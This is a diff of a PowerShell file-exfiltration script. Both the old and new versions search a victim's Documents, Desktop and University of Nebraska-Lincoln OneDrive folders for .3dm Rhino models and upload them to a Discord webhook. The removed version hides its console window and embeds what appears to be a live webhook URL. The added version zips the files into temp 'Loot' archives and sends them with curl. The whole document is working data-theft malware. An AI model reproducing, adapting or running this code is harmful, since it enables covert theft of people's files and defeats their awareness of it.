@@ -1,89 +1,71 @@
-[Console]::BackgroundColor = "Black"
-[Console]::SetWindowSize(57, 5)
-[Console]::Title = "Exfiltration"
-Clear-Host
+$hookurl = "$dc"
+# Shortened URL Detection
+if ($hookurl.Length -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $hookurl = (irm $hookurl).url
+}
 
-# Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
+Function Exfiltrate {
+    param ([string[]]$FileType, [string[]]$Path)
+    $maxZipFileSize = 25MB
+    $currentZipSize = 0
+    $index = 1
+    $zipFilePath = "$env:temp/Loot$index.zip"
 
-# Now only searching for .3dm files (Rhino 3D model)
-$fileExtensions = @("*.3dm")
-
-# Folders to search for .3dm files (removed Downloads, added OneDrive path)
-$foldersToSearch = @(
-    "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Desktop",
-    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
-)
-
-# Function to send file to Discord
-function Send-FileToDiscord {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$filePath,
-        [Parameter(Mandatory=$false)]
-        [string]$content = ""
-    )
-
-    $fileName = Split-Path -Leaf $filePath
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`n"
-    $body = (
-        "--$boundary$LF" +
-        "Content-Disposition: form-data; name=`"content`"$LF$LF" +
-        "$content$LF" +
-        "--$boundary$LF" +
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
-        "Content-Type: application/octet-stream$LF$LF" +
-        ([System.IO.File]::ReadAllBytes($filePath) | ConvertTo-Base64) + "$LF" +
-        "--$boundary--$LF"
-    )
-
-    try {
-        Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body
-        Write-Host "Successfully sent $($fileName) to Discord!" -ForegroundColor Green
-    } catch {
-        Write-Host "Error sending $($fileName) to Discord: $_" -ForegroundColor Red
+    # Define folders to search, including the new folder path
+    if ($Path -ne $null) {
+        $foldersToSearch = "$env:USERPROFILE\" + $Path
+    } else {
+        $foldersToSearch = @(
+            "$env:USERPROFILE\Documents",
+            "$env:USERPROFILE\Desktop",
+            "$env:USERPROFILE\OneDrive",
+            "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
+        )
     }
-}
 
-# Hiding the window
-Write-Host "Hiding the Window.."  -ForegroundColor Red
-sleep 1
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
-}
+    # Define file extensions to search for (.3dm files only)
+    if ($FileType -ne $null) {
+        $fileExtensions = "*." + $FileType
+    } else {
+        $fileExtensions = @("*.3dm")
+    }
 
-# Loop through all specified folders to search for .3dm files
-foreach ($folder in $foldersToSearch) {
-    Write-Host "Searching in $folder"  -ForegroundColor Yellow
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
 
-    foreach ($extension in $fileExtensions) {
-        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File
+    foreach ($folder in $foldersToSearch) {
+        foreach ($extension in $fileExtensions) {
+            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
+            foreach ($file in $files) {
+                $fileSize = $file.Length
+                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
+                    # Close current archive and upload it to Discord webhook
+                    $zipArchive.Dispose()
+                    curl.exe -F file1=@"$zipFilePath" $hookurl
+                    Remove-Item -Path $zipFilePath -Force
 
-        # Ensure that files are found before proceeding
-        if ($files.Count -eq 0) {
-            Write-Host "No .3dm files found in $folder" -ForegroundColor Red
-        }
-
-        foreach ($file in $files) {
-            Write-Host "Found $($file.FullName)"  -ForegroundColor Gray
-            # Send the file to the Discord webhook
-            Send-FileToDiscord -filePath $file.FullName
+                    # Reset variables for new archive creation
+                    Sleep 1
+                    $index++
+                    $zipFilePath = "$env:temp/Loot$index.zip"
+                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+                }
+                # Add file to the archive
+                $entryName = $file.FullName.Substring($folder.Length + 1)
+                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+                $currentZipSize += $fileSize
+            }
         }
     }
+    
+    # Finalize and upload remaining archive contents
+    $zipArchive.Dispose()
+    curl.exe -F file1=@"$zipFilePath" $hookurl
+    Remove-Item -Path $zipFilePath -Force
+
+    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
 
-# Notify that the exfiltration is complete (if window is not hidden)
-If ($hidden -ne 'y'){
-    Write-Host "File Exfiltration Attempted" -ForegroundColor Green
-}
+# Execute the function with .3dm file type filter and default paths
+Exfiltrate FileType "3dm"
